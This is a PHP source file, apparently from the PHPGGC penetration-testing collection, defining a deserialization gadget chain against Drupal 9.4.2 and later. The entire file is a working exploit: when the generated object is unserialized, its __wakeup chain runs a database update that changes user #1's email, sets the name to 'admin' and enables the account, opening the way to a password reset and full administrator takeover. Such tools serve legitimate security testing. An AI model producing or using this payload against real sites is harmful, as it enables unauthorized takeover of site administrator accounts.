<?php

namespace GadgetChain\Drupal9;

class AT1 extends \PHPGGC\GadgetChain\AccountTakeover
{
    public static $version = '9.4.2+';
    public static $vector = '__wakeup';
    public static $author = 'mcdruid';
    public static $information =
        'Updates the email address for user #1. The user name is also set to
        "admin", after which it should be possible to request a password reset.';

    public function generate(array $parameters)
    {
        return (
            new \Drupal\views\ViewExecutable(
                new \Drupal\mysql\Driver\Database\mysql\Update(
                    [
                        'mail' => $parameters['mail'],
                        'name' => 'admin',
                        'status' => 1, // ensure the account is not disabled
                    ],
                    new \Drupal\Core\Database\Query\Condition (
                        [
                          '#conjunction' => 'AND',
                           [
                               'field' => 'uid',
                               'value' => 1,
                               'operator' => '='
                           ]
                        ],
                    )
                ),
                new \Drupal\Views\DisplayPluginCollection(),
                new \Drupal\views\Plugin\views\display\DefaultDisplay()
            )
        );
    }
}
